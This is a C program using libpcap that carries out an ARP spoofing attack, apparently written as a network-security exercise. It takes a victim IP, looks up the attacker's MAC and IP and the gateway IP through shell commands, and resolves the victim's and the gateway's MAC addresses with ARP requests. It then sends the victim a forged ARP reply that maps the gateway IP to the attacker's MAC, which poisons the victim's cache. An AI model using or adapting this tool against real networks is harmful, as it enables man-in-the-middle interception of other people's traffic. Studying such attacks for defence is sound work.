#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <net/ethernet.h>
#include <netinet/ether.h>

pcap_t *handle;

int SendPacket(struct ether_addr dest, struct ether_addr sour, struct ether_addr send_mac, struct in_addr send_ip, struct ether_addr targ_mac, struct in_addr targ_ip, uint16_t opt)
{
	u_char packet[100];
	int length;
	struct ether_header eth_hdr;
	struct ether_arp arp_hdr;

	// Make ARP packet
	memcpy(eth_hdr.ether_dhost, &dest.ether_addr_octet, 6);
	memcpy(eth_hdr.ether_shost, &sour.ether_addr_octet, 6);
	eth_hdr.ether_type = htons(ETHERTYPE_ARP);

	arp_hdr.ea_hdr.ar_hrd = htons(1);
	arp_hdr.ea_hdr.ar_pro = htons(2048);
	arp_hdr.ea_hdr.ar_hln = 6;
	arp_hdr.ea_hdr.ar_pln = 4;
	arp_hdr.ea_hdr.ar_op = htons(opt);
	memcpy(&arp_hdr.arp_sha, &send_mac.ether_addr_octet, 6);
	memcpy(&arp_hdr.arp_spa, &send_ip.s_addr, 4);
	memcpy(&arp_hdr.arp_tha, &targ_mac.ether_addr_octet, 6);
	memcpy(&arp_hdr.arp_tpa, &targ_ip.s_addr, 4);

	memcpy(packet, &eth_hdr, 14);
	memcpy(packet + 14, &arp_hdr, sizeof(struct ether_arp));
	length = 14 + sizeof(struct ether_arp);
	if(length < 64)
	{
		for(int i = length; i < 64; i++)
			packet[i] = 0;
	}

	// Send packet
	if(pcap_sendpacket(handle, packet, length) != 0)
	{
		fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(handle));
		return -1;
	}
	return 0;
}

int FindMAC(struct ether_addr *targ_mac, struct ether_addr atkr_mac, struct in_addr atkr_ip, struct in_addr targ_ip)
{
	struct ether_addr broad, gap;
	struct pcap_pkthdr *header;
	struct ether_header *eth_hdr;
	struct ether_arp *arp_hdr;
	const u_char *recv_packet;
	int res;

	// Send ARP_REQUEST
	ether_aton_r("FF:FF:FF:FF:FF:FF", &broad);
	ether_aton_r("00:00:00:00:00:00", &gap);
	if(SendPacket(broad, atkr_mac, atkr_mac, atkr_ip, gap, targ_ip, ARPOP_REQUEST) < 0)
		return -1;

	// Receive ARP_REPLY
	while((res = pcap_next_ex(handle, &header, &recv_packet)) >= 0)
	{
		if(res == 0) continue;
		eth_hdr = (struct ether_header*)recv_packet;
		if(ntohs(eth_hdr->ether_type) != ETHERTYPE_ARP) continue;
		arp_hdr = (struct ether_arp*)(recv_packet + 14);
		if(ntohs(arp_hdr->ea_hdr.ar_op) != ARPOP_REPLY) continue;
		if(memcmp(&arp_hdr->arp_spa, &targ_ip.s_addr, 4) != 0) continue;

		memcpy(&targ_mac->ether_addr_octet, &arp_hdr->arp_sha, 6);
		break;
	}
	return 0;
}

int main(int argc, char *argv[])
{
	if(argc != 2)
	{
		printf("Input Error\n");
		return 0;
	}

	char *dev;
	char errbuf[PCAP_ERRBUF_SIZE];
	bpf_u_int32 mask;
	bpf_u_int32 net;

	dev = pcap_lookupdev(errbuf);
	if (dev == NULL) {
		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
		return(2);
	}

	// Find the properties for the device 
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}

	// Open the session in promiscuous mode
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(2);
	}

	FILE* fp;
	char kern[50], buf[20];
	struct ether_addr atkr_mac, vict_mac, gate_mac;
	struct in_addr atkr_ip, vict_ip, gate_ip;

	// Victim IP address
	inet_aton(argv[1], &vict_ip);

	// Attacker MAC address
	sprintf(kern, "ifconfig | grep '%s' | awk '{print $5}'", dev);
	fp = popen(kern, "r");
	fgets(buf, sizeof(buf), fp);
	pclose(fp);
	printf("Attacker MAC : %s", buf);
	ether_aton_r(buf, &atkr_mac);

	// Attacker IP address
	sprintf(kern, "ifconfig | grep -A 1 '%s' | grep 'inet' | awk '{print $2}' | awk -F':' '{print $2}'", dev);
	fp = popen(kern, "r");
	fgets(buf, sizeof(buf), fp);
	pclose(fp);
	printf("Attacker IP : %s", buf);
	inet_aton(buf, &atkr_ip);

	// Gateway IP address
	sprintf(kern, "netstat -r | grep 'default' | awk '{print $2}'");
	fp = popen(kern, "r");
	fgets(buf, sizeof(buf), fp);
	pclose(fp);
	printf("Gateway IP : %s", buf);
	inet_aton(buf, &gate_ip);

	// Victim MAC address
	if(FindMAC(&vict_mac, atkr_mac, atkr_ip, vict_ip) < 0)
		return 0;
	printf("Victim MAC : %s\n", ether_ntoa(&vict_mac));

	// Gateway MAC address
	if(FindMAC(&gate_mac, atkr_mac, atkr_ip, gate_ip) < 0)
		return 0;
	printf("Gateway MAC : %s\n", ether_ntoa(&gate_mac));

	// Send false ARP_REPLY
	if(SendPacket(vict_mac, atkr_mac, atkr_mac, gate_ip, vict_mac, vict_ip, ARPOP_REPLY) < 0)
		return 0;
	printf("ARP Spoofing Success!!\n");

	return 0;
}